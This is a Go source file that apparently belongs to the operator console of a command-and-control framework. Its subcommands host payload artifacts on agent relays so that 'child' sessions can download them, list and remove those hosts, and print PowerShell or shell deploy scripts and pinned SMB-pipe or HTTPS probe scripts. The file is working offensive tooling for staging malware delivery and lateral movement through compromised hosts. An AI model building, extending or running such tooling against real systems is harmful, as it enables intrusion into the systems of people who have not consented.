package main

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
)

func runPayloadAgentHost(ctx context.Context, out io.Writer, call consoleCaller, args []string) error {
	switch args[1] {
	case "host-agent":
		if len(args) != 6 {
			return errors.New("use payload host-agent PAYLOAD_ID AGENT_ID RELAY_BIND PUBLIC_HOST; start the relay first and give the address the child can reach")
		}
		artifact, err := resolvePayload(ctx, call, args[2])
		if err != nil {
			return err
		}
		body := map[string]string{"agent_id": args[3], "bind": args[4], "public_host": args[5]}
		data, err := call(ctx, http.MethodPost, "/v1/agent-artifacts/"+url.PathEscape(artifact.ID)+"/agent-hosts", body)
		if err != nil {
			return err
		}
		var host agentPayloadHostInfo
		if err := json.Unmarshal(data, &host); err != nil {
			return err
		}
		fmt.Fprintf(out, "Payload downloads enabled on relay %s (agent %s).\nHost ID: %s\nDelivery endpoint: %s\nThe parent retrieves the artifact over its existing Undertow session. The relay remains available for child sessions.\n", host.Bind, host.AgentID, host.ID, host.Retrieval)
		if host.PipePath != "" {
			fmt.Fprintf(out, "Use payload verify-script-agent %s powershell for a pinned SMB pipe probe.\n", host.ID)
		} else {
			fmt.Fprintf(out, "Use payload verify-script-agent %s powershell|shell for a pinned HTTPS probe.\n", host.ID)
		}
		return nil
	case "agent-hosts":
		if len(args) != 2 && len(args) != 3 {
			return errors.New("use payload agent-hosts [PAYLOAD_ID]")
		}
		path := "/v1/agent-hosts"
		if len(args) == 3 {
			artifact, err := resolvePayload(ctx, call, args[2])
			if err != nil {
				return err
			}
			path = "/v1/agent-artifacts/" + url.PathEscape(artifact.ID) + "/agent-hosts"
		}
		data, err := call(ctx, http.MethodGet, path, nil)
		if err != nil {
			return err
		}
		var hosts []agentPayloadHostInfo
		if err := json.Unmarshal(data, &hosts); err != nil {
			return err
		}
		if len(hosts) == 0 {
			fmt.Fprintln(out, "No active relay payload downloads.")
			return nil
		}
		for _, host := range hosts {
			fmt.Fprintf(out, "%s  payload=%s  agent=%s  bind=%s\n  %s\n", host.ID, host.ArtifactID, host.AgentID, host.Bind, host.Retrieval)
		}
		return nil
	case "unhost-agent":
		if len(args) != 3 {
			return errors.New("use payload unhost-agent HOST_ID")
		}
		if _, err := call(ctx, http.MethodDelete, "/v1/agent-hosts/"+url.PathEscape(args[2]), nil); err != nil {
			return err
		}
		fmt.Fprintf(out, "Disabled payload download %s; its relay listener remains active.\n", args[2])
		return nil
	case "deploy-script-agent", "verify-script-agent":
		if len(args) != 4 || args[3] != "powershell" && args[3] != "shell" {
			return errors.New("use payload deploy-script-agent|verify-script-agent HOST_ID powershell|shell")
		}
		data, err := call(ctx, http.MethodGet, "/v1/agent-hosts/"+url.PathEscape(args[2]), nil)
		if err != nil {
			return err
		}
		var host agentPayloadHostInfo
		if err := json.Unmarshal(data, &host); err != nil {
			return err
		}
		artifact, err := resolvePayload(ctx, call, host.ArtifactID)
		if err != nil {
			return err
		}
		hosted := hostedArtifactInfo{Artifact: artifact.Artifact, Retrieval: host.Retrieval, RetrievalPath: host.RetrievalPath, PipePath: host.PipePath, TLSSelfSigned: host.TLSSelfSigned, TLSCertSHA256: host.TLSCertSHA256, TLSPublicKeyPin: host.TLSPublicKeyPin}
		if args[1] == "verify-script-agent" {
			return printAgentHostProbeScript(out, hosted, args[3])
		}
		return printDeployScript(out, hosted, args[3])
	}
	return fmt.Errorf("unknown agent payload host command %q", args[1])
}
